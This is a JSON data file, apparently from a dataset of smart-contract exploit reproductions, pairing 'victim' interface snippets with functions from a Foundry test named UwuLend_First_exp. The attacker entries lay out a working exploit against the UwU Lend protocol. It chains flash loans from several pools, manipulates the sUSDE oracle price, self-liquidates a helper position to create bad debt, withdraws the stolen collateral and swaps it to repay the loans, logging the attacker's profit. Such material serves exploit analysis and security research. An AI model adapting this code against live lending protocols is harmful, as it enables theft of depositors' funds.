[
  {
    "contract/interface": "IcrvUSDController",
    "source_type": "victim_contract",
    "function_name": "create_loan",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IcrvUSDController",
    "source_type": "victim_contract",
    "function_name": "repay",
    "original_code": "  function repay(\n    address asset,\n    uint256 amount,\n    uint256 rateMode,\n    address onBehalfOf\n  ) external returns (uint256);\n\n",
    "description": ""
  },
  {
    "contract/interface": "ISDAI",
    "source_type": "victim_contract",
    "function_name": "allowance",
    "original_code": "  function allowance(address _owner, address _spender)\n    public view returns (uint256);\n\n",
    "description": ""
  },
  {
    "contract/interface": "ISDAI",
    "source_type": "victim_contract",
    "function_name": "approve",
    "original_code": "  function approve(address _spender, uint256 _value) public returns (bool) {\n    allowed[msg.sender][_spender] = _value;\n    emit Approval(msg.sender, _spender, _value);\n    return true;\n  }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ISDAI",
    "source_type": "victim_contract",
    "function_name": "balanceOf",
    "original_code": "  function balanceOf(address _owner) public view returns (uint256) {\n    return balances[_owner];\n  }\n\n}\n\n// File: openzeppelin-solidity/contracts/token/ERC20/ERC20.sol\n\n",
    "description": ""
  },
  {
    "contract/interface": "ISDAI",
    "source_type": "victim_contract",
    "function_name": "decimals",
    "original_code": "    function decimals() public view virtual override returns (uint8) {\n        return 18;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ISDAI",
    "source_type": "victim_contract",
    "function_name": "deposit",
    "original_code": "  function deposit(\n    address asset,\n    uint256 amount,\n    address onBehalfOf,\n    uint16 referralCode\n  ) external;\n\n",
    "description": ""
  },
  {
    "contract/interface": "ISDAI",
    "source_type": "victim_contract",
    "function_name": "name",
    "original_code": "    function name() public view virtual override returns (string memory) {\n        return _name;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ISDAI",
    "source_type": "victim_contract",
    "function_name": "owner",
    "original_code": "    function owner() public view virtual returns (address) {\n        return _owner;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ISDAI",
    "source_type": "victim_contract",
    "function_name": "redeem",
    "original_code": "  function redeem(uint256 shares, address receiver, address _owner)\n    public\n    virtual\n    override\n    ensureCooldownOff\n    returns (uint256)\n  {\n    return super.redeem(shares, receiver, _owner);\n  }\n\n  /// @notice Claim the staking amount after the cooldown has finished. The address can only retire the full amount of assets.\n  /// @dev unstake can be called after cooldown have been set to 0, to let accounts to be able to claim remaining assets locked at Silo\n  /// @param receiver Address to send the assets by the staker\n",
    "description": ""
  },
  {
    "contract/interface": "ISDAI",
    "source_type": "victim_contract",
    "function_name": "symbol",
    "original_code": "    function symbol() public view virtual override returns (string memory) {\n        return _symbol;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ISDAI",
    "source_type": "victim_contract",
    "function_name": "totalSupply",
    "original_code": "  function totalSupply() public view returns (uint256) {\n    return totalSupply_;\n  }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ISDAI",
    "source_type": "victim_contract",
    "function_name": "transfer",
    "original_code": "  function transfer(address _to, uint256 _value) public returns (bool) {\n    require(_value <= balances[msg.sender]);\n    require(_to != address(0));\n\n    balances[msg.sender] = balances[msg.sender].sub(_value);\n    balances[_to] = balances[_to].add(_value);\n    emit Transfer(msg.sender, _to, _value);\n    return true;\n  }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ISDAI",
    "source_type": "victim_contract",
    "function_name": "transferFrom",
    "original_code": "    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) external returns (bool);\n\n    /// @notice Event emitted when tokens are transferred from one address to another, either via `#transfer` or `#transferFrom`.\n    /// @param from The account from which the tokens were sent, i.e. the balance decreased\n    /// @param to The account to which the tokens were sent, i.e. the balance increased\n    /// @param value The amount of tokens that were transferred\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    /// @notice Event emitted when the approval amount for the spender of a given owner's tokens changes.\n    /// @param owner The account that approved spending of its tokens\n    /// @param spender The account for which the spending allowance was modified\n    /// @param value The new allowance from the owner to the spender\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n",
    "description": ""
  },
  {
    "contract/interface": "ISDAI",
    "source_type": "victim_contract",
    "function_name": "withdraw",
    "original_code": "  function withdraw(\n    address asset,\n    uint256 amount,\n    address to\n  ) external returns (uint256);\n\n",
    "description": ""
  },
  {
    "contract/interface": "ToBeLiquidatedHelper",
    "source_type": "victim_contract",
    "function_name": "openPosition",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ToBeLiquidatedHelper",
    "source_type": "victim_contract",
    "function_name": "withdrawCollateralToLiquidationThreshold",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "UwuLend_First_exp",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "UwuLend_First_exp",
    "source_type": "attacker_contract",
    "function_name": "depositsUSDEBackToUWULendPool",
    "original_code": "    function depositsUSDEBackToUWULendPool() external {\n        uwuLendPool.deposit(address(sUSDE), sUSDE.balanceOf(address(this)), address(this), 0);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "UwuLend_First_exp",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "UwuLend_First_exp",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "UwuLend_First_exp",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "UwuLend_First_exp",
    "source_type": "attacker_contract",
    "function_name": "executeOperation",
    "original_code": "    function executeOperation(\n        address[] calldata assets,\n        uint256[] calldata amounts,\n        uint256[] calldata premiums,\n        address initiator,\n        bytes calldata params\n    ) external payable returns (bool) {\n        if (msg.sender == address(aaveFlashloan_1)) {\n            WETH.approve(address(msg.sender), type(uint256).max);\n            WBTC.approve(address(msg.sender), type(uint256).max);\n\n            // aaveV2 flashloan WETH\n            address[] memory assets_2 = new address[](1);\n            assets_2[0] = address(WETH);\n            uint256[] memory amounts_2 = new uint256[](1);\n            amounts_2[0] = 40_000_000_000_000_000_000_000;\n            uint256[] memory modes_2 = new uint256[](1);\n            modes_2[0] = 0;\n            aaveFlashloan_2.flashLoan(address(this), assets_2, amounts_2, modes_2, address(0), \"\", 0);\n            return true;\n        } else if (msg.sender == address(aaveFlashloan_2)) {\n            WETH.approve(address(msg.sender), type(uint256).max);\n\n            // 2.2 sparkPool flashloan WETH and WBTC\n            console.log(\"2.2 sparkPool flashloan WETH and WBTC\");\n            address[] memory assets_3 = new address[](2);\n            assets_3[0] = address(WETH);\n            assets_3[1] = address(WBTC);\n            uint256[] memory amounts_3 = new uint256[](2);\n            amounts_3[0] = 91_075_709_275_272_202_604_853;\n            amounts_3[1] = 497_979_338_310;\n            uint256[] memory modes_3 = new uint256[](2);\n            modes_3[0] = 0;\n            modes_3[1] = 0;\n            sparkPool.flashLoan(address(this), assets_3, amounts_3, modes_3, address(0), \"\", 0);\n            return true;\n        } else if (msg.sender == address(sparkPool)) {\n            WETH.approve(address(msg.sender), type(uint256).max);\n            WBTC.approve(address(msg.sender), type(uint256).max);\n\n            // 2.3 morphoBlueFlashLoan flashloan sUSDE USDE DAI\n            console.log(\"2.3 morphoBlueFlashLoan flashloan sUSDE USDE DAI\");\n            morphoBlueFlashLoan.flashLoan(address(sUSDE), 301_738_880_017_013_808_137_779_682, \"\");\n            return true;\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "UwuLend_First_exp",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "UwuLend_First_exp",
    "source_type": "attacker_contract",
    "function_name": "onFlashLoan",
    "original_code": "    function onFlashLoan(\n        address initiator,\n        address token,\n        uint256 amount,\n        uint256 fee,\n        bytes calldata data\n    ) external returns (bytes32) {\n        DAI.approve(address(makerDaoFlash), type(uint256).max);\n\n        logFlashLoanAssets();\n\n        // 3. Make bad debt (during liquidation process) position by sUSDE price manipulation\n        console.log(\"\\n  3. Make bad debt (during liquidation process) position by sUSDE price manipulation \\n\");\n        // 3.1 drive down sUSDE price\n        console.log(\"3.1 drive down sUSDE price\");\n\n        uint256 sUSDE_price_before = uwuPriceOracle.getAssetPrice(address(sUSDE));\n        console.log(\"sUSDE price before\", sUSDE_price_before);\n\n        driveDownsUSDEPrice();\n\n        uint256 sUSDE_price_after = uwuPriceOracle.getAssetPrice(address(sUSDE));\n        console.log(\"sUSDE price after\", sUSDE_price_after);\n        emit log_named_decimal_uint(\n            \"sUSDE price change ratio \", (sUSDE_price_before - sUSDE_price_after) * 1e8 / sUSDE_price_before, 8\n        );\n\n        // 3.2 deposit WBTC DAI sUSDE to uwuLendPool and set WBTC, DAI as collateral\n\n        uwuLendPool.deposit(address(WBTC), WBTC.balanceOf(address(this)), address(this), 0);\n        uwuLendPool.deposit(address(DAI), DAI.balanceOf(address(this)) - 30_000_000 ether, address(this), 0);\n        uwuLendPool.deposit(address(sUSDE), sUSDE.balanceOf(address(this)), address(this), 0);\n        uwuLendPool.setUserUseReserveAsCollateral(address(sUSDE), false);\n\n        // 3.3 transfer WETH to toBeLiquidatedHelper contract and create sUSDE debt position to max ltv\n        console.log(\"\\n  3.3 transfer WETH to toBeLiquidatedHelper contract and create sUSDE debt position to max ltv\");\n        console.log(\"-------------------------------helper contract open position -----------------------------------\");\n\n        WETH.transfer(address(toBeLiquidatedHelper), WETH.balanceOf(address(this)));\n        toBeLiquidatedHelper.openPosition();\n        addETHCollateralToHelper();\n        toBeLiquidatedHelper.openPosition();\n\n        (\n            uint256 totalCollateral,\n            uint256 totalDebt,\n            uint256 availableBorrows,\n            uint256 currentLiquidationThreshold,\n            uint256 ltv,\n            uint256 healthFactor\n        ) = uwuLendPool.getUserAccountData(address(toBeLiquidatedHelper));\n\n        emit log_named_decimal_uint(\"to be liquidated position debt value\", totalDebt, 8);\n        uint256 currentLTV = totalDebt * 1e4 / totalCollateral;\n        emit log_named_decimal_uint(\"current ltv\", currentLTV, 4);\n        emit log_named_decimal_uint(\"maxLtv\", WETHMAXLTV, 4);\n        emit log_named_decimal_uint(\"current healthFactor\", healthFactor, 18);\n\n        // 3.4 liquidation threshold reached by withdraw collateral\n        console.log(\"\\n  3.4 liquidation threshold reached by withdraw collateral\");\n        toBeLiquidatedHelper.withdrawCollateralToLiquidationThreshold();\n\n        (totalCollateral, totalDebt,,,, healthFactor) = uwuLendPool.getUserAccountData(address(toBeLiquidatedHelper));\n        currentLTV = totalDebt * 1e4 / totalCollateral;\n        emit log_named_decimal_uint(\"current ltv\", currentLTV, 4);\n        emit log_named_decimal_uint(\"maxLtv\", WETHMAXLTV, 4);\n        emit log_named_decimal_uint(\"current healthFactor\", healthFactor, 18);\n\n        console.log(\"------------------------helper contract was ready to be liquidated ------------------------------\");\n        console.log(\"\");\n\n        // 3.5 drive up sUSDE price\n        console.log(\"3.5 drive up sUSDE price\");\n        uint256 sUSDE_price_before_driveUp = uwuPriceOracle.getAssetPrice(address(sUSDE));\n        console.log(\"sUSDE price before\", sUSDE_price_before_driveUp);\n\n        driveUpsUSDEPrice();\n\n        uint256 sUSDE_price_after_driveUp = uwuPriceOracle.getAssetPrice(address(sUSDE));\n        console.log(\"sUSDE price after\", sUSDE_price_after_driveUp);\n        emit log_named_decimal_uint(\n            \"sUSDE price change ratio \",\n            (sUSDE_price_after_driveUp - sUSDE_price_before_driveUp) * 1e8 / sUSDE_price_before_driveUp,\n            8\n        );\n\n        // 4. liquidate helper contract to theft assets from protocol\n\n        console.log(\"\\n  4. liquidate helper contract to theft assets from protocol\");\n        (totalCollateral, totalDebt,,, ltv, healthFactor) =\n            uwuLendPool.getUserAccountData(address(toBeLiquidatedHelper));\n        emit log_named_decimal_uint(\"total collateral value\", totalCollateral, 8);\n        emit log_named_decimal_uint(\"total debt value\", totalDebt, 8);\n        currentLTV = totalDebt * 1e4 / totalCollateral;\n        emit log_named_decimal_uint(\"current ltv\", currentLTV, 4);\n        emit log_named_decimal_uint(\"health factor\", healthFactor, 18);\n        uint256 badDebtRatio = currentLTV * liquidationBonus / 1e4 - 1e4;\n        emit log_named_decimal_uint(\"bad debt ratio\", badDebtRatio, 4);\n\n        // 4.1 repeat liquidate helper contract\n        console.log(\"\\n  4.1 repeat liquidate helper contract\");\n        uwuLendPool.liquidationCall(\n            address(WETH), address(sUSDE), address(toBeLiquidatedHelper), sUSDE.balanceOf(address(this)), true\n        );\n        while (uWETH.balanceOf(address(toBeLiquidatedHelper)) > 0) {\n            uwuLendPool.withdraw(address(sUSDE), sUSDE.balanceOf(address(uSUSDE)), address(this));\n            uwuLendPool.liquidationCall(\n                address(WETH), address(sUSDE), address(toBeLiquidatedHelper), sUSDE.balanceOf(address(this)), true\n            );\n        }\n\n        // 4.2 withdraw deposited collateral from uwuLendPool\n        console.log(\"\\n  4.2 withdraw deposited collateral from uwuLendPool\");\n        uwuLendPool.withdraw(address(WETH), WETH.balanceOf(address(uWETH)), address(this));\n        uwuLendPool.repay(address(WETH), type(uint256).max, 2, address(this));\n        uwuLendPool.withdraw(address(WETH), uWETH.balanceOf(address(this)), address(this));\n\n        uwuLendPool.withdraw(address(WBTC), uWBTC.balanceOf(address(this)), address(this));\n        uwuLendPool.withdraw(address(DAI), uDAI.balanceOf(address(this)), address(this));\n        uwuLendPool.withdraw(address(sUSDE), sUSDE.balanceOf(address(uSUSDE)), address(this));\n\n        emit log_named_decimal_uint(\n            \"\\n  attacker stolen uSUSDE balance\", uSUSDE.balanceOf(address(this)), uSUSDE.decimals()\n        );\n        uint256 stolenuSUSDEValue =\n            uSUSDE.balanceOf(address(this)) * uwuPriceOracle.getAssetPrice(address(sUSDE)) / 1e18;\n        emit log_named_decimal_uint(\"stolen uSUSDE value\", stolenuSUSDEValue, 8);\n\n        uwuLendPool.deposit(address(sUSDE), 4_346_738_161_827_961_681_800_155, address(this), 0);\n        uSUSDE.transfer(address(borrowHelper), uSUSDE.balanceOf(address(this)));\n\n        // 4.3 Borrowing other assets with stolen sUSDE\n        console.log(\"\\n  4.3 Borrowing other assets with stolen sUSDE\");\n        borrowHelper.borrow();\n\n        // 4.4 swap assets to repay flashloan\n        console.log(\"\\n  4.4 swap assets to repay flashloan\");\n        // swap USDE to crvUSD\n        USDecrvUSDPool.exchange(0, 1, 4_207_072_750_824_992_858_620_994, 0, address(this));\n        // swap USDE to DAI\n        USDeDAIPool.exchange(0, 1, 10_922_948_419_648_084_328_018_472, 0, address(this));\n        // swap USDE to FRAX\n        FRAXUSDePool.exchange(1, 0, 22_726_036_777_489_049_150_148_818, 0, address(this));\n        // swap USDE to GHO\n        GHOUSDePool.exchange(1, 0, 3_839_532_488_615_605_211_975_616, 0, address(this));\n        // swap USDE to USDC\n        USDCUSDePool.exchange(0, 1, 13_004_083_286_363_350_285_706_546, 0, address(this));\n\n        // repay crvUSD loan\n        crvUSDController.repay(8_000_000 ether, address(this), type(int256).max, false);\n        // swap GHO to USDE\n        GHOUSDePool.exchange(0, 1, 6_514_807_919_582_140_746_012, 0, address(this));\n        // swap sUSDE to sDAI\n        sUSDE.approve(address(MtEthena), type(uint256).max);\n        MtEthena.exchange(1, 0, 461_496_017_260_554_794_537_319, 0, address(this));\n        sDAI.redeem(sDAI.balanceOf(address(this)), address(this), address(this));\n        // swap crvUSD to USDE\n        USDecrvUSDPool.exchange(1, 0, 13_674_859_859_068_798_018_828, 0, address(this));\n        // swap USDC to USDE\n        USDCUSDePool.exchange(1, 0, 192_649_121_137, 0, address(this));\n        // swap USDE to USDC\n        USDCUSDePool.exchange(0, 1, 5_476_157_462_097_941_699_706, 0, address(this));\n        // swap FRAX to DAI\n        DAI_FRAX_Pair.swap(\n            address(this), false, 43_839_520_259_800_487_407_899, 88_130_155_430_238_081_648_620_165_685, \"\"\n        );\n\n        // swap DAI to USDC\n        int256 swapAmount = int256(\n            DAI.balanceOf(address(this)) - (100_786_052_157_846_064_524_359_193 + 500_000_000_000_000_000_000_000_000)\n        );\n        DAI_USDC_Pair.swap(address(this), true, swapAmount, 71_305_012_436_624_238_479_427, \"\");\n        // swap USDC to WETH\n        swapAmount = int256(USDC.balanceOf(address(this)) - 15_007_500_000_000);\n        USDC_WETH_Pair.swap(address(this), true, swapAmount, 1_176_655_315_611_429_354_240_742_931_620_633, \"\");\n        // swap WETH to WBTC\n        WBTC_WETH_Pair.swap(address(this), false, -740_000_000, 38_270_603_846_108_809_178_175_541_220_721_878, \"\");\n\n        bytes32 CALLBACK_SUCCESS = keccak256(\"ERC3156FlashBorrower.onFlashLoan\");\n        return CALLBACK_SUCCESS;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "UwuLend_First_exp",
    "source_type": "attacker_contract",
    "function_name": "onMorphoFlashLoan",
    "original_code": "    function onMorphoFlashLoan(uint256 amounts, bytes calldata) external {\n        if (amounts == 301_738_880_017_013_808_137_779_682) {\n            sUSDE.approve(address(morphoBlueFlashLoan), type(uint256).max);\n            morphoBlueFlashLoan.flashLoan(address(USDE), 236_934_023_171_356_495_803_977_358, \"\");\n        } else if (amounts == 236_934_023_171_356_495_803_977_358) {\n            USDE.approve(address(morphoBlueFlashLoan), type(uint256).max);\n            morphoBlueFlashLoan.flashLoan(address(DAI), 100_786_052_157_846_064_524_359_193, \"\");\n        } else if (amounts == 100_786_052_157_846_064_524_359_193) {\n            DAI.approve(address(morphoBlueFlashLoan), type(uint256).max);\n\n            // 2.4 FRAX_USDC_Pair flashloan USDC and FRAX\n            console.log(\"2.4 FRAX_USDC_Pair flashloan USDC and FRAX\");\n            FRAX_USDC_Pair.flash(address(this), 60_000_000_000_000_000_000_000_000, 15_000_000_000_000, \"\");\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "UwuLend_First_exp",
    "source_type": "attacker_contract",
    "function_name": "receiveFlashLoan",
    "original_code": "    function receiveFlashLoan(\n        address[] memory tokens,\n        uint256[] memory amounts,\n        uint256[] memory feeAmounts,\n        bytes memory userData\n    ) external {\n        // 2.6 makerDaoFlash flashloan DAI\n        console.log(\"2.6 makerDaoFlash flashloan DAI \\n\");\n        makerDaoFlash.flashLoan(address(this), address(DAI), 500_000_000_000_000_000_000_000_000, \"\");\n\n        GHO.transfer(address(msg.sender), 4_627_557_475_392_554_171_233_727);\n        WETH.transfer(address(msg.sender), 38_413_346_774_514_588_021_409);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "UwuLend_First_exp",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 20_061_318);\n        vm.label(address(WETH), \"WETH\");\n        vm.label(address(DAI), \"DAI\");\n        vm.label(address(crvUSD), \"crvUSD\");\n        vm.label(address(WBTC), \"WBTC\");\n        vm.label(address(sUSDE), \"sUSDE\");\n        vm.label(address(USDE), \"USDE\");\n        vm.label(address(GHO), \"GHO\");\n        vm.label(address(USDC), \"USDC\");\n        vm.label(address(FRAX), \"FRAX\");\n        vm.label(address(crvUSDController), \"crvUSDController\");\n        vm.label(address(crvUSDWETHPool), \"crvUSDWETHPool\");\n        vm.label(address(USDecrvUSDPool), \"USDecrvUSDPool\");\n        vm.label(address(USDeDAIPool), \"USDeDAIPool\");\n        vm.label(address(FRAXUSDePool), \"FRAXUSDePool\");\n        vm.label(address(GHOUSDePool), \"GHOUSDePool\");\n        vm.label(address(USDCUSDePool), \"USDCUSDePool\");\n        vm.label(address(MtEthena), \"MtEthena\");\n        vm.label(address(aaveFlashloan_1), \"aaveFlashloan_1\");\n        vm.label(address(aaveFlashloan_2), \"aaveFlashloan_2\");\n        vm.label(address(sparkPool), \"sparkPool\");\n        vm.label(address(morphoBlueFlashLoan), \"morphoBlueFlashLoan\");\n        vm.label(address(FRAX_USDC_Pair), \"FRAX_USDC_Pair\");\n        vm.label(address(BalancerVault), \"balancerVault\");\n        vm.label(address(makerDaoFlash), \"makerDaoFlash\");\n        vm.label(address(uwuLendPool), \"uwuLendPool\");\n        vm.label(address(uwuPriceOracle), \"uwuPriceOracle\");\n        vm.label(address(uSUSDE), \"uSUSDE\");\n        vm.label(address(uWETH), \"uWETH\");\n        vm.label(address(uWBTC), \"uWBTC\");\n        vm.label(address(uDAI), \"uDAI\");\n        vm.label(address(DAI_FRAX_Pair), \"DAI_FRAX_Pair\");\n        vm.label(address(DAI_USDC_Pair), \"DAI_USDC_Pair\");\n        vm.label(address(USDC_WETH_Pair), \"USDC_WETH_Pair\");\n        vm.label(address(WBTC_WETH_Pair), \"WBTC_WETH_Pair\");\n        vm.label(address(sDAI), \"sDAI\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "UwuLend_First_exp",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "UwuLend_First_exp",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "UwuLend_First_exp",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "UwuLend_First_exp",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "UwuLend_First_exp",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "UwuLend_First_exp",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "UwuLend_First_exp",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        toBeLiquidatedHelper = new ToBeLiquidatedHelper();\n        vm.label(address(toBeLiquidatedHelper), \"toBeLiquidatedHelper\");\n        borrowHelper = new BorrowHelper();\n        vm.label(address(borrowHelper), \"borrowHelper\");\n\n        // 1. approve all\n        console.log(\"1. approveAll \\n\");\n        approveAll();\n\n        // 2. flashLoan\n        // 2.1 aave flashloan WETH and WBTC\n        // 2.2 sparkPool flashloan WETH and WBTC\n        // 2.3 morphoBlueFlashLoan flashloan sUSDE USDE DAI\n        // 2.4 FRAX_USDC_Pair flashloan USDC and FRAX\n        // 2.5 BalancerVault flashloan USDC\n        // 2.6 makerDaoFlash flashloan DAI\n        console.log(\"2. flashLoan\");\n        flashLoan();\n\n        // 3. exploit logic in onFlashLoan\n\n        // 5. profit\n\n        emit log_named_decimal_uint(\"\\n  attacker profit\", WETH.balanceOf(address(this)), WETH.decimals());\n    }\n\n    // exploit logic\n",
    "description": ""
  },
  {
    "contract/interface": "UwuLend_First_exp",
    "source_type": "attacker_contract",
    "function_name": "uniswapV3FlashCallback",
    "original_code": "    function uniswapV3FlashCallback(uint256 amount0, uint256 amount1, bytes calldata data) external {\n        // 2.5 BalancerVault flashloan USDC\n        console.log(\"2.5 BalancerVault flashloan USDC\");\n        address[] memory tokens = new address[](2);\n        tokens[0] = address(GHO);\n        tokens[1] = address(WETH);\n        uint256[] memory amounts = new uint256[](2);\n        amounts[0] = 4_627_557_475_392_554_171_233_727;\n        amounts[1] = 38_413_346_774_514_588_021_409;\n        BalancerVault.flashLoan(address(this), tokens, amounts, \"\");\n        FRAX.transfer(address(msg.sender), 60_030_000_000_000_000_000_000_000);\n        USDC.transfer(address(msg.sender), 15_007_500_000_000);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "UwuLend_First_exp",
    "source_type": "attacker_contract",
    "function_name": "uniswapV3SwapCallback",
    "original_code": "    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external {\n        if (msg.sender == address(DAI_FRAX_Pair)) {\n            FRAX.transfer(msg.sender, uint256(amount1Delta));\n        } else if (msg.sender == address(DAI_USDC_Pair)) {\n            DAI.transfer(msg.sender, uint256(amount0Delta));\n        } else if (msg.sender == address(USDC_WETH_Pair)) {\n            USDC.transfer(msg.sender, uint256(amount0Delta));\n        } else if (msg.sender == address(WBTC_WETH_Pair)) {\n            WETH.transfer(msg.sender, uint256(amount1Delta));\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "BorrowHelper",
    "source_type": "victim_contract",
    "function_name": "borrow",
    "original_code": "  function borrow(\n    address asset,\n    uint256 amount,\n    uint256 interestRateMode,\n    uint16 referralCode,\n    address onBehalfOf\n  ) external;\n\n",
    "description": ""
  },
  {
    "contract/interface": "IAaveOracle",
    "source_type": "victim_contract",
    "function_name": "getAssetPrice",
    "original_code": "  function getAssetPrice(address asset) public view override returns (uint256) {\n    IChainlinkAggregator source = assetsSources[asset];\n\n    if (asset == BASE_CURRENCY) {\n      return BASE_CURRENCY_UNIT;\n    } else if (address(source) == address(0)) {\n      return _fallbackOracle.getAssetPrice(asset);\n    } else {\n      int256 price = IChainlinkAggregator(source).latestAnswer();\n      if (price > 0) {\n        return uint256(price);\n      } else {\n        return _fallbackOracle.getAssetPrice(asset);\n      }\n    }\n  }\n\n  /// @notice Gets a list of prices from a list of assets addresses\n  /// @param assets The list of assets addresses\n",
    "description": ""
  }
]